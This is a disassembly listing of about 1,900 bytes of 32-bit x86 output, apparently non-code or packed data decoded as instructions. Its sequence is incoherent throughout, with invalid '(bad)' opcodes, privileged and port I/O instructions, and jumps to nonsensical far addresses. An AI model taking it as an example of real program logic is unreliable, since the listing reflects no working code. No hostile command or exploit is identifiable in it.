  414a25:	fist   DWORD PTR [esi-0x172af3d6]
  414a2b:	push   edi
  414a2c:	xor    BYTE PTR [ebp+0x29],0xa4
  414a30:	enter  0x1345,0xec
  414a34:	sbb    edx,DWORD PTR ds:0x45ba0683
  414a3a:	ror    DWORD PTR [edx],cl
  414a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a3d:	adc    dl,ch
  414a3f:	adc    dl,BYTE PTR [edx+ecx*2]
  414a42:	ja     0x414a10
  414a44:	push   eax
  414a45:	fucomp st(4)
  414a47:	sahf   
  414a48:	dec    esi
  414a49:	icebp  
  414a4a:	xor    eax,DWORD PTR [esi+edi*8-0x63272ac7]
  414a51:	arpl   ax,bp
  414a53:	mov    al,0x69
  414a55:	dec    ebp
  414a56:	adc    al,0xe3
  414a58:	imul   esp,eax,0xffffffa2
  414a5b:	out    0x56,eax
  414a5d:	into   
  414a5e:	cli    
  414a5f:	pop    ss
  414a60:	cmp    ebp,DWORD PTR [ebx]
  414a62:	jl     0x414a43
  414a64:	aad    0xeb
  414a66:	xor    edi,DWORD PTR [esi+0x47]
  414a69:	sbb    BYTE PTR [edx+0x32496e08],dl
  414a6f:	sbb    DWORD PTR [ecx-0x537b4572],edx
  414a75:	inc    esi
  414a76:	lds    esi,FWORD PTR [ecx+0x0]
  414a79:	or     BYTE PTR [esi],cl
  414a7b:	and    eax,0xc6b91aaf
  414a80:	or     ecx,DWORD PTR [edi+0x6530ba74]
  414a86:	and    BYTE PTR [edx],bh
  414a88:	jmp    0xe330270f
  414a8d:	arpl   WORD PTR [edx+0x40],bp
  414a90:	cmp    edx,DWORD PTR [edi-0x5e]
  414a93:	inc    ecx
  414a94:	stc    
  414a95:	enter  0x2956,0x9f
  414a99:	iret   
  414a9a:	lock push edx
  414a9c:	jmp    0x5848:0x8e339d60
  414aa3:	(bad)  
  414aa4:	mov    DWORD PTR [edi-0x51744fea],edx
  414aaa:	dec    edx
  414aab:	dec    ecx
  414aac:	jbe    0x414afd
  414aae:	cld    
  414aaf:	rcl    DWORD PTR [edx+0x20],cl
  414ab2:	jmp    0x50f4dcd
  414ab7:	sti    
  414ab8:	fistp  WORD PTR [ebx]
  414aba:	mov    bh,0x4b
  414abc:	(bad)  
  414abd:	push   ds
  414abe:	out    0x1a,eax
  414ac0:	(bad)  
  414ac1:	dec    esp
  414ac2:	aas    
  414ac3:	test   esi,edi
  414ac5:	fsubr  DWORD PTR [ecx]
  414ac7:	pop    ds
  414ac8:	xchg   edx,eax
  414ac9:	adc    al,0xe0
  414acb:	and    al,0x45
  414acd:	xchg   esi,eax
  414ace:	loope  0x414b34
  414ad0:	add    al,0xfd
  414ad2:	pop    ebx
  414ad3:	and    DWORD PTR [edi-0x54],ecx
  414ad6:	aad    0x12
  414ad8:	stc    
  414ad9:	jp     0x414a5d
  414adb:	push   esp
  414adc:	aaa    
  414add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ade:	push   ss
  414adf:	xor    BYTE PTR [ebx-0x40],dh
  414ae2:	jo     0x414b52
  414ae4:	pop    ds
  414ae5:	(bad)  
  414ae6:	aas    
  414ae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ae8:	adc    al,0x3f
  414aea:	(bad)  
  414aeb:	cmp    DWORD PTR [eax+ebx*2+0x53b90dde],edi
  414af2:	and    dh,bl
  414af4:	into   
  414af5:	pop    ds
  414af6:	pop    edx
  414af7:	jl     0x414aa0
  414af9:	mov    edx,0x56399832
  414afe:	push   es
  414aff:	pop    ebx
  414b00:	stc    
  414b01:	loopne 0x414b19
  414b03:	pushf  
  414b04:	xor    esi,esp
  414b06:	jg     0x414aa7
  414b08:	add    esi,DWORD PTR [edx]
  414b0a:	xchg   esi,eax
  414b0b:	jbe    0x414b05
  414b0d:	mov    ebp,0x25391503
  414b12:	cmp    ecx,DWORD PTR [edi+esi*4+0x16b4e28f]
  414b19:	scas   eax,DWORD PTR es:[edi]
  414b1a:	dec    esi
  414b1b:	(bad)  
  414b1d:	or     DWORD PTR [ecx-0x63998af6],esp
  414b23:	xlat   BYTE PTR ds:[ebx]
  414b24:	cmp    eax,0x32bf4d65
  414b29:	jg     0x414b00
  414b2b:	inc    ebx
  414b2c:	push   esi
  414b2d:	aam    0xa0
  414b2f:	push   esp
  414b30:	dec    ecx
  414b31:	ins    DWORD PTR es:[edi],dx
  414b32:	xchg   ecx,eax
  414b33:	push   ebx
  414b34:	pop    ebp
  414b35:	mov    ah,0xdc
  414b37:	pop    es
  414b38:	das    
  414b39:	xchg   BYTE PTR [edx-0x28d27eb8],ch
  414b3f:	jbe    0x414ba3
  414b41:	dec    esp
  414b42:	scas   eax,DWORD PTR es:[edi]
  414b43:	xchg   ah,dl
  414b45:	das    
  414b46:	sbb    DWORD PTR [edx-0x15],edi
  414b49:	adc    eax,0xdcffc210
  414b4e:	mov    eax,ds:0x9d4d706d
  414b53:	cmp    al,ch
  414b55:	dec    ecx
  414b56:	and    edx,ecx
  414b58:	jecxz  0x414b12
  414b5a:	fdiv   DWORD PTR [edx+edx*4+0x11]
  414b5e:	add    al,0x6
  414b60:	jns    0x414bc7
  414b62:	ds bswap esp
  414b65:	(bad)  
  414b66:	adc    DWORD PTR [eax+edi*1+0x2eccc9db],eax
  414b6d:	cmp    eax,0xee01147f
  414b72:	pusha  
  414b73:	sti    
  414b74:	sbb    eax,0xb3f13706
  414b79:	int3   
  414b7a:	imul   edi,ecx,0x6f
  414b7d:	push   ss
  414b7e:	pop    ebx
  414b7f:	(bad)  
  414b80:	cld    
  414b81:	pop    edi
  414b82:	scas   eax,DWORD PTR es:[edi]
  414b83:	jb     0x414b0e
  414b85:	popa   
  414b86:	jecxz  0x414bd5
  414b88:	ja     0x414b43
  414b8a:	dec    ebp
  414b8b:	push   0xbf018678
  414b90:	outs   dx,BYTE PTR ds:[esi]
  414b91:	les    ecx,FWORD PTR [eax]
  414b93:	xor    eax,DWORD PTR [esi]
  414b95:	daa    
  414b96:	adc    eax,0x9a26883c
  414b9b:	sbb    esp,edx
  414b9d:	fs mov ch,0x32
  414ba0:	add    BYTE PTR [ebp+0x12],ah
  414ba3:	loopne 0x414b30
  414ba5:	mov    esp,0x3566b144
  414baa:	stc    
  414bab:	dec    esp
  414bac:	int3   
  414bad:	in     al,dx
  414bae:	pxor   mm7,QWORD PTR [esi-0x67dcf380]
  414bb5:	jnp    0x414bd0
  414bb7:	popf   
  414bb8:	mov    dh,0x5
  414bba:	hlt    
  414bbb:	sub    DWORD PTR [esi+0x40],0xccf40ba1
  414bc2:	adc    al,0xef
  414bc4:	jmp    0xcd93:0x9775c7a1
  414bcb:	xlat   BYTE PTR ds:[ebx]
  414bcc:	bound  esi,QWORD PTR [ecx-0x2d]
  414bcf:	xchg   bh,dl
  414bd1:	push   es
  414bd2:	mov    ecx,0x47315409
  414bd7:	adc    ebp,eax
  414bd9:	mov    edi,0xd6801792
  414bde:	ficom  DWORD PTR [eax-0x3c]
  414be1:	jle    0x414bb2
  414be3:	in     al,dx
  414be4:	test   eax,0xd299332e
  414be9:	dec    ecx
  414bea:	dec    ebx
  414beb:	mov    cl,0xd3
  414bed:	fldcw  WORD PTR [ebp+0x7ef1378b]
  414bf3:	clc    
  414bf4:	ss jo  0x414c2d
  414bf7:	and    dh,ah
  414bf9:	int    0x87
  414bfb:	sbb    ch,BYTE PTR [edi-0x20abc82c]
  414c01:	lods   eax,DWORD PTR ds:[esi]
  414c02:	std    
  414c03:	sub    DWORD PTR [eax+0x7245ae02],0xffffff99
  414c0a:	jecxz  0x414b9b
  414c0c:	test   BYTE PTR [ebp-0x44],bh
  414c0f:	ins    DWORD PTR es:[edi],dx
  414c10:	xchg   edi,eax
  414c11:	outs   dx,DWORD PTR ds:[esi]
  414c12:	adc    bl,BYTE PTR [ebp+eiz*8+0x61fee580]
  414c19:	add    ecx,eax
  414c1b:	jecxz  0x414bf5
  414c1d:	mov    fs,edi
  414c1f:	fcmovu st,st(1)
  414c21:	jecxz  0x414bea
  414c23:	mov    ds:0x8b5315e7,eax
  414c28:	xchg   ebp,eax
  414c29:	mov    al,ds:0x7d659055
  414c2e:	dec    ebx
  414c2f:	or     dh,BYTE PTR [ecx+0x38]
  414c32:	sbb    BYTE PTR [ecx-0x16ff07fc],bh
  414c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c39:	outs   dx,BYTE PTR ds:[esi]
  414c3a:	sub    BYTE PTR [ecx+0x232066b],dl
  414c40:	cmp    esi,esi
  414c42:	mov    dh,0x50
  414c44:	xor    BYTE PTR [edi],bh
  414c46:	loope  0x414c03
  414c48:	push   cs
  414c49:	dec    esi
  414c4a:	xor    BYTE PTR [esi],dl
  414c4c:	push   cs
  414c4d:	les    eax,FWORD PTR [edi-0x3a5c97a6]
  414c53:	mov    dh,BYTE PTR [esi-0x1ed32cbc]
  414c59:	pushf  
  414c5a:	mov    cl,BYTE PTR [ecx+0x72663df8]
  414c60:	inc    edx
  414c61:	mov    ds:0x17ec6fd8,al
  414c66:	mov    al,ah
  414c68:	add    al,dh
  414c6a:	sub    ch,BYTE PTR [ecx+ecx*4]
  414c6d:	pop    ebp
  414c6e:	sub    DWORD PTR [edx],0xfffffff0
  414c71:	not    ebp
  414c73:	fisttp WORD PTR [edi+0x7b]
  414c76:	or     al,0x94
  414c78:	cmp    ebx,0x42
  414c7b:	inc    edi
  414c7c:	jnp    0x414c03
  414c7e:	int    0x3
  414c80:	js     0x414c86
  414c82:	and    DWORD PTR [edi+0x25],esi
  414c85:	fimul  WORD PTR [edi-0x311d1fb0]
  414c8b:	or     BYTE PTR [edi+0x38ddb226],cl
  414c91:	pop    ss
  414c92:	jae    0x414c84
  414c94:	popa   
  414c95:	inc    ebp
  414c96:	enter  0x4d7f,0xe8
  414c9a:	inc    esi
  414c9b:	rcr    DWORD PTR [edi+0x65],1
  414c9e:	fist   DWORD PTR [ecx+0x32]
  414ca1:	fisttp WORD PTR [esi-0x5b83d704]
  414ca7:	fwait
  414ca8:	fs push cs
  414caa:	push   ebx
  414cab:	rcl    DWORD PTR [esi+ebp*8-0x765b5ae7],cl
  414cb2:	dec    esi
  414cb3:	and    eax,0xcd92ef61
  414cb8:	jge    0x414ce4
  414cba:	cld    
  414cbb:	retf   0x986e
  414cbe:	cmc    
  414cbf:	cmp    ecx,ebx
  414cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cc2:	inc    ebp
  414cc3:	mov    DWORD PTR [eax+eax*4+0x51],esi
  414cc7:	sub    DWORD PTR [eax+edi*8+0x34e6b11d],0x50dac6fc
  414cd2:	std    
  414cd3:	or     ah,BYTE PTR [esi]
  414cd5:	sub    al,0xb8
  414cd7:	test   DWORD PTR [ecx],0x9ae4eef8
  414cdd:	pop    edx
  414cde:	cmp    BYTE PTR [edi+0x33],0xab
  414ce2:	fcmovu st,st(5)
  414ce4:	pushf  
  414ce5:	daa    
  414ce6:	(bad)  
  414ce7:	into   
  414ce8:	sub    edi,DWORD PTR [edi+0x27]
  414ceb:	mov    eax,ds:0x5c75da56
  414cf0:	jle    0x414d0d
  414cf2:	dec    edi
  414cf3:	jle    0x414caf
  414cf5:	mov    dh,0x97
  414cf7:	push   edi
  414cf8:	shl    BYTE PTR [esi-0x3273ff7c],1
  414cfe:	or     al,BYTE PTR [ebx+ecx*4]
  414d01:	aam    0xcd
  414d03:	push   esi
  414d04:	out    0xe,eax
  414d06:	mov    esi,0xf88b79d2
  414d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d0c:	pop    esp
  414d0d:	clc    
  414d0e:	xlat   BYTE PTR ds:[ebx]
  414d0f:	pop    ebx
  414d10:	ja     0x414d00
  414d12:	add    al,0x1f
  414d14:	sub    ch,BYTE PTR [ecx+0x3e]
  414d17:	es push eax
  414d19:	or     eax,DWORD PTR [ecx-0x4c40d9d7]
  414d1f:	call   0xc346:0x24cb6bbe
  414d26:	iret   
  414d27:	aaa    
  414d28:	addr16 rdmsr 
  414d2b:	fstp   DWORD PTR [esi-0x15bc0e49]
  414d31:	into   
  414d32:	test   al,0x5a
  414d34:	imul   ebp,DWORD PTR [edx+esi*4],0x51
  414d38:	inc    ebp
  414d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d3a:	mov    ebx,0x6de02511
  414d3f:	pop    ebp
  414d40:	xor    al,0xc9
  414d42:	sbb    al,0x44
  414d44:	mov    eax,0x47b63c90
  414d49:	inc    eax
  414d4a:	imul   esp,DWORD PTR [ebp-0x6934679c],0x9d2d5a3a
  414d54:	push   0xffffffc4
  414d56:	jno    0x414d8a
  414d58:	inc    esp
  414d59:	xor    bh,BYTE PTR [ebp+0x15]
  414d5c:	sbb    DWORD PTR [edi],eax
  414d5e:	mov    eax,ds:0x902c889d
  414d63:	sbb    DWORD PTR [ebp+0x62],0x4efc10a5
  414d6a:	mov    cl,0x80
  414d6c:	xor    DWORD PTR [edx+0xd],ecx
  414d6f:	sub    BYTE PTR [eax-0xb],bh
  414d72:	inc    ebx
  414d73:	jns    0x414dbe
  414d75:	ins    BYTE PTR es:[edi],dx
  414d76:	ror    BYTE PTR [ecx],cl
  414d78:	repnz inc esp
  414d7a:	ss adc eax,0xa8dbcbdb
  414d80:	or     BYTE PTR ds:0xcbba4dac,0x7
  414d87:	and    ecx,esi
  414d89:	into   
  414d8a:	mov    fs,WORD PTR [edi-0x30]
  414d8d:	mov    al,0xb
  414d8f:	daa    
  414d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d91:	out    0x49,al
  414d93:	test   DWORD PTR [ecx+0x8d26aa3],ebp
  414d99:	jns    0x414d6b
  414d9b:	ret    
  414d9c:	xor    edi,DWORD PTR [edx]
  414d9e:	mov    cl,0x29
  414da0:	mov    ebx,0xa5f499f8
  414da5:	lea    eax,[eax]
  414da7:	stos   BYTE PTR es:[edi],al
  414da8:	or     eax,0xbf7de8be
  414dad:	nop
  414dae:	cmp    ebp,DWORD PTR [eax-0x784819ac]
  414db4:	imul   edi,DWORD PTR [edx],0x10
  414db7:	sub    cl,BYTE PTR [ebx]
  414db9:	mov    cs,WORD PTR [ebx*1+0x447ff38f]
  414dc0:	dec    esp
  414dc1:	inc    edx
  414dc2:	and    BYTE PTR [eax+edi*8-0x4911a8e1],ch
  414dc9:	fld    TBYTE PTR [ebp+0x3b]
  414dcc:	dec    edx
  414dcd:	(bad)  
  414dce:	lock add al,0xa6
  414dd1:	aas    
  414dd2:	fimul  DWORD PTR [ebx+0x21]
  414dd5:	daa    
  414dd6:	mov    dl,0xcd
  414dd8:	mov    BYTE PTR [ecx],ah
  414dda:	pop    esi
  414ddb:	and    al,0xee
  414ddd:	dec    ebp
  414dde:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414de0:	sbb    edi,edx
  414de2:	xchg   esp,eax
  414de3:	inc    eax
  414de4:	xor    bl,BYTE PTR [edx-0x3fc908ea]
  414dea:	dec    edx
  414deb:	shr    DWORD PTR [ebp-0x551fe498],1
  414df1:	es aad 0x8d
  414df4:	push   cs
  414df5:	je     0x414e56
  414df7:	sbb    eax,0xa22cf758
  414dfc:	rcl    esi,1
  414dfe:	nop
  414dff:	outs   dx,BYTE PTR ds:[esi]
  414e00:	pop    edx
  414e01:	pop    esp
  414e02:	fild   WORD PTR [eax-0x25]
  414e05:	test   eax,0x35e281f
  414e0a:	mov    ah,0x64
  414e0c:	scas   eax,DWORD PTR es:[edi]
  414e0d:	xchg   DWORD PTR [esi+0x75],edi
  414e10:	(bad)  
  414e11:	sub    cl,BYTE PTR [eax]
  414e13:	mov    DWORD PTR [esi+0x5c],eax
  414e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e17:	pop    ecx
  414e18:	inc    edx
  414e19:	xor    ebp,DWORD PTR [esi]
  414e1b:	dec    edx
  414e1c:	push   edx
  414e1d:	into   
  414e1e:	out    dx,al
  414e1f:	fnstsw WORD PTR [edx]
  414e21:	ds pextrw eax,(bad),0xc5
  414e24:	add    ebp,DWORD PTR [ebx+0x19]
  414e27:	loope  0x414e97
  414e29:	sub    eax,0xf398f86b
  414e2e:	push   0xffffffff
  414e30:	mov    esi,0xca410410
  414e35:	out    0xd2,eax
  414e37:	fnstenv [ebx+0x72]
  414e3a:	jbe    0x414dc1
  414e3c:	ins    BYTE PTR es:[edi],dx
  414e3d:	pop    es
  414e3e:	mov    edx,0x3dbf88ee
  414e43:	push   ebx
  414e44:	mov    al,ds:0xb6192c90
  414e49:	int    0x82
  414e4b:	scas   al,BYTE PTR es:[edi]
  414e4c:	bound  eax,QWORD PTR [ecx]
  414e4e:	adc    DWORD PTR [esp+edx*1],0x719aa94b
  414e55:	mov    ch,0xfc
  414e57:	and    DWORD PTR [edx-0x7b],edi
  414e5a:	ss jmp 0x414e55
  414e5d:	dec    esi
  414e5e:	in     eax,0x73
  414e60:	mov    DWORD PTR [ebp+0x58],esi
  414e63:	pop    ecx
  414e64:	sbb    BYTE PTR [ebx],0x46
  414e67:	add    eax,0xdd6b9b9a
  414e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e6d:	and    edx,DWORD PTR [edx+0x3e]
  414e70:	repnz xchg bh,dl
  414e73:	sbb    esp,DWORD PTR [ebx-0x47]
  414e76:	and    eax,0x53466aae
  414e7b:	jb     0x414e22
  414e7d:	(bad)  
  414e7e:	shl    BYTE PTR [edi-0x797cd92a],cl
  414e84:	out    dx,al
  414e85:	push   0x27a49775
  414e8a:	into   
  414e8b:	inc    ebx
  414e8c:	inc    edi
  414e8d:	sbb    ecx,DWORD PTR [ecx]
  414e8f:	or     DWORD PTR [ecx],esp
  414e91:	scas   al,BYTE PTR es:[edi]
  414e92:	test   DWORD PTR [esi-0x49],ebx
  414e95:	sbb    dl,BYTE PTR [esi+eax*4+0x13]
  414e99:	ret    
  414e9a:	imul   eax,DWORD PTR [eax],0xfffffffc
  414e9d:	out    0x78,al
  414e9f:	mov    ebx,0x8a9e992f
  414ea4:	out    0x6d,eax
  414ea6:	(bad)  
  414ea7:	call   0x319b1ea4
  414eac:	outs   dx,BYTE PTR ds:[esi]
  414ead:	ja     0x414e91
  414eaf:	pop    DWORD PTR [edi]
  414eb1:	and    al,0xfc
  414eb3:	mov    ebx,0x546f3fd9
  414eb8:	sbb    al,0xdd
  414eba:	push   ebp
  414ebb:	cmp    dh,cl
  414ebd:	pop    edx
  414ebe:	stos   DWORD PTR es:[edi],eax
  414ebf:	push   es
  414ec0:	push   ecx
  414ec1:	repz mov bh,0xe1
  414ec4:	xchg   edx,eax
  414ec5:	hlt    
  414ec6:	add    eax,0xdb75bdd6
  414ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ecc:	xchg   BYTE PTR [ebp-0x6863d668],bl
  414ed2:	xor    eax,0xbbb270aa
  414ed7:	fwait
  414ed8:	je     0x414ebd
  414eda:	test   eax,0xd1dcde0b
  414edf:	push   0x2aba59ef
  414ee4:	mov    DWORD PTR [esi+0x6f],eax
  414ee7:	test   al,0xab
  414ee9:	cld    
  414eea:	gs and dh,bh
  414eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eee:	jo     0x414f50
  414ef0:	xchg   esi,eax
  414ef1:	add    BYTE PTR [ebx-0x19ec98d5],dh
  414ef7:	xchg   edx,eax
  414ef8:	pop    ebp
  414ef9:	sbb    DWORD PTR [edx],esp
  414efb:	les    edx,FWORD PTR [ebx]
  414efd:	js     0x414f4d
  414eff:	jecxz  0x414f11
  414f01:	mov    BYTE PTR [edx-0x444158c5],al
  414f07:	std    
  414f08:	mov    al,ds:0x25e5a1f7
  414f0d:	inc    ebx
  414f0e:	xor    eax,0x8788e761
  414f13:	jo     0x414f85
  414f15:	fisttp QWORD PTR [ebx+ebp*1]
  414f18:	xchg   esi,eax
  414f19:	cs (bad) 
  414f1b:	push   esp
  414f1c:	xor    bh,BYTE PTR [eax]
  414f1e:	imul   ebp,DWORD PTR ds:0xbd1d1354,0xffffffcd
  414f25:	mov    al,ds:0x6bb7586c
  414f2a:	adc    edi,DWORD PTR [edx]
  414f2c:	or     BYTE PTR [edi+ecx*4+0x734acaf3],0xe4
  414f34:	icebp  
  414f35:	imul   edi,esp,0x6368abaa
  414f3b:	pop    ds
  414f3c:	call   0xc62c65fa
  414f41:	dec    ebp
  414f42:	fiadd  DWORD PTR [eax-0x50e34e73]
  414f48:	in     al,dx
  414f49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f4a:	dec    esi
  414f4b:	pop    esp
  414f4c:	pushf  
  414f4d:	loop   0x414f89
  414f4f:	inc    ebx
  414f50:	clc    
  414f51:	shl    BYTE PTR [eax],0xfa
  414f54:	fistp  QWORD PTR [esi-0x3d]
  414f57:	mov    eax,ds:0xc9041ecc
  414f5c:	jmp    0xcd9e90d3
  414f61:	stos   DWORD PTR es:[edi],eax
  414f62:	jb     0x414f65
  414f64:	js     0x414fbe
  414f66:	fidiv  WORD PTR [edi]
  414f68:	data16 mov al,ds:0xc4a84480
  414f6e:	int3   
  414f6f:	dec    ebp
  414f70:	int3   
  414f71:	mov    WORD PTR [edi-0x49],ss
  414f74:	sbb    DWORD PTR [edx-0x2342c1f5],edi
  414f7a:	xchg   esi,eax
  414f7b:	dec    edi
  414f7c:	gs lahf 
  414f7e:	adc    esp,DWORD PTR [ebx+ecx*2]
  414f81:	icebp  
  414f82:	cmp    BYTE PTR [ebx+0x47],bl
  414f85:	xchg   ecx,eax
  414f86:	pop    edx
  414f87:	pop    ss
  414f88:	mov    ah,al
  414f8a:	add    BYTE PTR [edi-0x3f],ah
  414f8d:	inc    eax
  414f8e:	aaa    
  414f8f:	cs mov dh,0x59
  414f92:	jne    0x414f58
  414f94:	dec    edi
  414f95:	call   0xa654:0x9de6adfc
  414f9c:	rol    DWORD PTR [esi+ebp*8-0x7f],0xb5
  414fa1:	or     ah,ch
  414fa3:	and    eax,0xffffff91
  414fa6:	push   ebp
  414fa7:	xchg   esp,eax
  414fa8:	fimul  WORD PTR [ecx-0x1df17836]
  414fae:	and    ecx,edx
  414fb0:	retf   
  414fb1:	jb     0x414ffd
  414fb3:	pop    ds
  414fb4:	popf   
  414fb5:	jne    0x414f63
  414fb7:	int    0x6e
  414fb9:	stc    
  414fba:	jnp    0x414f5d
  414fbc:	push   edx
  414fbd:	lods   eax,DWORD PTR ds:[esi]
  414fbe:	ins    DWORD PTR es:[edi],dx
  414fbf:	imul   esi,DWORD PTR [ebx+0x1eb8502e],0x64cad30d
  414fc9:	int3   
  414fca:	push   ecx
  414fcb:	std    
  414fcc:	pusha  
  414fcd:	and    eax,0x32bcccfa
  414fd2:	data16 cs stos BYTE PTR es:[edi],al
  414fd5:	mov    ch,0x68
  414fd7:	mov    ch,0xb4
  414fd9:	stos   BYTE PTR es:[edi],al
  414fda:	xchg   edx,eax
  414fdb:	sbb    al,dh
  414fdd:	jge    0x414fac
  414fdf:	mov    bh,0x94
  414fe1:	rcl    BYTE PTR [ebx],0x16
  414fe4:	mov    cs,WORD PTR [ebx+0x2f39c449]
  414fea:	idiv   DWORD PTR [eax-0x5a]
  414fed:	lds    ebx,FWORD PTR [ecx+0x37]
  414ff0:	ins    BYTE PTR es:[edi],dx
  414ff1:	mov    eax,0xc97963c6
  414ff6:	push   es
  414ff7:	mov    al,0x49
  414ff9:	in     eax,0xc
  414ffb:	xchg   ecx,eax
  414ffc:	xor    esp,esp
  414ffe:	scas   eax,DWORD PTR es:[edi]
  414fff:	or     cl,bl
  415001:	adc    edx,0x64
  415004:	enter  0x1ccd,0x38
  415008:	stos   DWORD PTR es:[edi],eax
  415009:	mov    edx,0xd7097405
  41500e:	nop
  41500f:	adc    eax,0x7cf13516
  415014:	sub    ch,bh
  415016:	aam    0x8f
  415018:	mov    esi,0xf60e58a7
  41501d:	pop    eax
  41501e:	ret    0xfdda
  415021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415022:	mov    ebp,es
  415024:	mov    ecx,0x544be7dd
  415029:	or     dh,BYTE PTR [edx+0x4c401f11]
  41502f:	adc    BYTE PTR [ebx],ah
  415031:	xchg   edi,eax
  415032:	shl    DWORD PTR [edx],cl
  415034:	pop    es
  415035:	shl    BYTE PTR [edi],1
  415037:	cmp    eax,0x4040a374
  41503c:	dec    ebp
  41503d:	lods   al,BYTE PTR ds:[esi]
  41503e:	(bad)  
  41503f:	inc    esp
  415040:	jno    0x414fc8
  415042:	(bad)  [ebx-0x18]
  415045:	loope  0x414fe6
  415047:	fidivr DWORD PTR [ebx-0x7c2ffa9e]
  41504d:	mov    al,cs:0x1773652e
  415053:	xchg   esi,eax
  415054:	xchg   ebp,eax
  415055:	inc    edx
  415056:	inc    ebx
  415057:	inc    edi
  415058:	adc    ecx,DWORD PTR [edx-0x77defff4]
  41505e:	out    dx,eax
  41505f:	stc    
  415060:	mov    esp,DWORD PTR [edx+0x1f6c7a56]
  415066:	mov    bl,0xfd
  415068:	sub    ecx,eax
  41506a:	(bad)  
  41506c:	icebp  
  41506d:	cmp    cl,BYTE PTR [esi-0x60]
  415070:	out    dx,al
  415071:	dec    ebp
  415072:	add    bh,BYTE PTR [eax+0x1c8f16b]
  415078:	push   cs
  415079:	push   ebx
  41507a:	mov    ds:0x630a4db9,eax
  41507f:	cmp    BYTE PTR [esi],0xe6
  415082:	mov    esi,edx
  415084:	mov    eax,ds:0x22dd7149
  415089:	mov    dh,0xe2
  41508b:	push   ds
  41508c:	xor    al,0xcc
  41508e:	pop    edi
  41508f:	push   ebx
  415090:	push   ebx
  415091:	loopne 0x4150bd
  415093:	or     BYTE PTR [edi-0x38],ah
  415096:	push   es
  415097:	sub    al,0xa2
  415099:	mov    DWORD PTR [esi+ebp*4+0x413046b9],esi
  4150a0:	inc    ebx
  4150a1:	add    edx,DWORD PTR [ecx-0x70]
  4150a4:	mov    ecx,0xc27621bd
  4150a9:	push   ds
  4150aa:	mov    ebp,0xa090f39
  4150af:	jmp    0x415100
  4150b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150b2:	(bad)  
  4150b3:	inc    esp
  4150b4:	xchg   edi,eax
  4150b5:	sub    BYTE PTR [edi+eax*2],0x87
  4150b9:	add    edx,0x20
  4150bc:	or     BYTE PTR [ecx+0x28],cl
  4150bf:	stos   BYTE PTR es:[edi],al
  4150c0:	loop   0x4150d0
  4150c2:	pop    esp
  4150c3:	test   DWORD PTR [ebp+0x9a273b8],edi
  4150c9:	lds    edi,FWORD PTR [ebx+0x39c37bda]
  4150cf:	sti    
  4150d0:	hlt    
  4150d1:	jae    0x415079
  4150d3:	sub    eax,0x1824aff1
  4150d8:	imul   esp,DWORD PTR [eax+0x6c],0x2b
  4150dc:	jecxz  0x4150d4
  4150de:	rcr    edx,0xf4
  4150e1:	push   0xffffff90
  4150e3:	icebp  
  4150e4:	adc    eax,0x98e9b732
  4150e9:	pop    ebx
  4150ea:	into   
  4150eb:	adc    bl,ah
  4150ed:	add    eax,0x2c97f25
  4150f2:	mov    edx,0x43eb92b2
  4150f7:	inc    edx
  4150f8:	cmp    eax,0x959dc847
  4150fd:	jp     0x415113
  4150ff:	sahf   
  415100:	lock mov dl,0xa2
  415103:	shrd   DWORD PTR ds:0xdfab48c4,esi,0xbd
  41510b:	inc    esi
  41510c:	dec    esi
  41510d:	test   DWORD PTR [edi+0x7bc1b8c8],edx
  415113:	shr    dh,0xd5
  415116:	nop
  415117:	pushf  
  415118:	adc    ch,BYTE PTR [edi]
  41511a:	cld    
  41511b:	mov    cl,0x20
  41511d:	(bad)  
  41511e:	sbb    BYTE PTR [esi-0x4f451508],bh
  415124:	jmp    0xad36:0x4d703888
  41512b:	stos   BYTE PTR es:[edi],al
  41512c:	adc    ebx,DWORD PTR [eax+eax*2+0x26]
  415130:	bound  ebx,QWORD PTR [ecx]
  415132:	pop    ebp
  415133:	fs movd edx,mm6
  415137:	lds    esp,FWORD PTR [ecx]
  415139:	mov    ds:0x3695a78d,al
  41513e:	fld    DWORD PTR [edx+0x5ae84d54]
  415144:	fadd   st(2),st
  415146:	push   ebx
  415147:	push   ss
  415148:	ror    BYTE PTR gs:[ecx+0x6d],cl
  41514c:	and    al,0x29
  41514e:	sbb    cl,cl
  415150:	stc    
  415151:	or     DWORD PTR [esi+0x5ae64017],eax
  415157:	jecxz  0x4151aa
  415159:	(bad)  
  41515a:	hlt    
  41515b:	push   ebp
  41515c:	inc    esi
  41515d:	inc    BYTE PTR ds:0x9e804e6f
  415163:	aaa    
  415164:	lds    eax,FWORD PTR [eax+0x63]
  415167:	and    eax,0x8f02bae
  41516c:	loopne 0x4151b8
  41516e:	mov    cl,0x7d
  415170:	in     al,dx
  415171:	in     al,0x1f
  415173:	cli    
  415174:	call   0xc7e5:0x43d9b837
  41517b:	cs sahf 
  41517d:	dec    edi
  41517e:	aad    0xf2
  415180:	xchg   edi,eax
  415181:	repz inc ecx
  415183:	dec    ecx
  415184:	pop    ebx
  415185:	pop    esp
  415186:	jo     0x415171
  415188:	mov    esp,0x38200fcc
  41518d:	imul   esi,DWORD PTR [esi],0xd436acea
  415193:	sar    BYTE PTR [edi-0x286339b2],1
  415199:	mov    ch,0x6e
  41519b:	retf   
  41519c:	inc    edx
  41519d:	rcl    DWORD PTR [ebp+0x18e13958],cl
  4151a3:	(bad)  
  4151a4:	mov    ch,BYTE PTR [ebx+0x33]
  4151a7:	or     DWORD PTR [edi],esi
  4151a9:	ret    0x18db
  4151ac:	fdivr  QWORD PTR ss:[ebx+0x54]
  4151b0:	fistp  QWORD PTR [ebx+0x52]
  4151b3:	retf   
